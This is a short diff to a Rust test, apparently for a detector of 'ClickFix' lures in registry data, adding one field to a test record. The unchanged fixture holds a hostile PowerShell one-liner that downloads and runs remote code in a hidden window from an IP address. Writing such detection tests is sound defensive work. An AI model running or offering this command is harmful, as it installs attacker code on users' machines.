@@ -530,6 +530,7 @@ mod tests {
             value: "a".into(),
             data: r"powershell -w h -c iex(irm http://203.0.113.9/x)\1".into(),
             last_write: None,
+            mru_rank: None,
         };
         let mut f = cairn_heur::ClickFixHeuristic
             .analyze(&[Record::RegValue(rv)], &[])
